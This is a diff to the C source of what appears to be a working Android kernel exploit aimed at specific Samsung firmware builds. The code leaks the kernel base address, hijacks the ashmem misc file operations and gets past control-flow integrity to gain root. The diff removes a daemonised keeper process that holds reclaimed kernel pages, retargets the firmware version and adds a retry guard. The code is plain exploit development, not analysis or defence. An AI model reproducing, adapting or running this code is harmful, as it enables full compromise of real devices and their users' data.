@@ -148,42 +148,6 @@ void run_main_route_threads(void) {
   SYSCHK(pthread_join(cfi, NULL));
 }
 
-static pid_t spawn_allocation_keeper(void) {
-  pid_t child = SYSCHK(fork());
-  if (child != 0) {
-    return child;
-  }
-
-  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
-  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
-  syscall(SYS_setsid);
-
-  int null_fd = (int)syscall(
-      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
-  if (null_fd >= 0) {
-    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
-      if (null_fd != fd) {
-        syscall(SYS_dup3, null_fd, fd, 0);
-      }
-    }
-    if (null_fd > STDERR_FILENO) {
-      syscall(SYS_close, null_fd);
-    }
-  } else {
-    syscall(SYS_close, STDIN_FILENO);
-    syscall(SYS_close, STDOUT_FILENO);
-    syscall(SYS_close, STDERR_FILENO);
-  }
-
-  struct timespec hold = {
-    .tv_sec = 86400,
-    .tv_nsec = 0,
-  };
-  for (;;) {
-    syscall(SYS_nanosleep, &hold, NULL);
-  }
-}
-
 int run_exploit(int argc, char **argv) {
   (void)argc;
   (void)argv;
@@ -191,9 +155,12 @@ int run_exploit(int argc, char **argv) {
   disable_rseq_for_thread();
   set_limit();
   log_startup_context();
-  pr_info("[cfi-trace4] upstream=2b4e8a64b78d18f236f0d5b26cfd204bc46363ce target=S908BXXSMGZB2 policy=one-cfi-per-child lifecycle-breadcrumbs=1\n");
+  pr_info("[cfi-trace4] target=S906BXXSNGZD7 policy=one-cfi-per-child "
+          "early-misc-fops-restore=1 hold-on-uncertain=1\n");
   rmg_log_reclaim_lifetime("child-run-start");
   init_ashmem_path();
+  cfi_block_retry = 0;
+  (void)mlockall(MCL_CURRENT | MCL_FUTURE);
 
   pin_to_core(CORE);
   if (!slide_leak_kernel_base()) {
@@ -209,6 +176,13 @@ int run_exploit(int argc, char **argv) {
   pin_to_core(CORE);
 
   run_main_route_threads();
+
+  if (cfi_block_retry) {
+    pr_error("[cfi-hold] refusing further attempts this boot "
+             "(ashmem_misc.fops may still be hijacked)\n");
+    rmg_log_reclaim_lifetime("cfi-hold-no-retry");
+    return CFI_RETRY_BLOCKED_EXIT;
+  }
 
   if (atomic_load(&rmg_cfi_observation_done) &&
       !atomic_load(&cfi_stage_done)) {
@@ -235,7 +209,7 @@ int run_exploit(int argc, char **argv) {
   }
   int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
   if (exploit_ok) {
-    pid_t keeper = spawn_allocation_keeper();
+    pid_t keeper = spawn_stability_keeper();
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                keeper);
   }
